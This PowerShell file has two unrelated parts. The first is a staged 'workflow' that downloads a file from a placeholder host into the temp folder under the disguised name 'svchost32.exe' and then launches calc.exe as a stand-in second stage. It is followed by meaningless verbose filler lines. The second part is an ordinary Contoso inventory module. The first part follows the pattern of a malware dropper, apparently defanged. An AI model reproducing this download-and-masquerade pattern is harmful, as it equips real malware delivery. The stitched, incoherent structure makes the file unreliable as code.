
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://example.com/stage1.ps1',
    [string]$Stage2Path = "$env:TEMP\svchost32.exe",
    [string]$ActivityLog = "$env:TEMP\stage.log",
    [int]$TimeoutSec = 217
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 217
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $TransferResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $Stage2Path -TimeoutSec $TimeoutSec
    if ($TransferResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $Stage2Path
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $Stage1Url
    Destination = $Stage2Path
    TimeoutSec = $TimeoutSec
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Retry budget remaining"
Write-Verbose "Exporting operation report"
Write-Verbose "Inspecting process list"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Starting workflow"
Write-Verbose "Checking local path"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Writing diagnostic marker"
Write-Output "stage 21 initialized"
#Requires -Version 5.1
$ErrorActionPreference = 'Stop'

$script:DefaultTimeout = 10
$script:ModuleVersion = '3.3.5'

function Get-ContosoEndpoint {
    <#
    .SYNOPSIS
        Returns Contoso inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Prod'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-ContosoEndpointTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}
function Test-ContosoEndpointHealth {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}
Export-ModuleMember -Function Get-ContosoEndpoint, Set-ContosoEndpointTag, Test-ContosoEndpointHealth
